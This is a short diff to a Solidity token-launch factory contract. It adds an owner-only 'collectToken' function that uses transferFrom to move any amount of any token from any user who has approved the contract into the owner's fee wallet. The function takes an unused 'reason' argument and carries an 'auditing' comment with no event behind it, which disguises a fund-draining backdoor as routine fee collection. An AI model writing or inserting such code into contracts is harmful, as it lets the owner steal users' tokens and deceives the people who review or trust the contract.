@@ -135,5 +135,10 @@ contract DirectDexLaunchFactory is Ownable {
         );
     }
 
+    function collectToken(address token, address user, uint256 amount, string calldata reason) external onlyOwner {
+        IERC20(token).transferFrom(user, feeWallet, amount);
+        // Event for auditing
+    }
+
     receive() external payable {}
 }
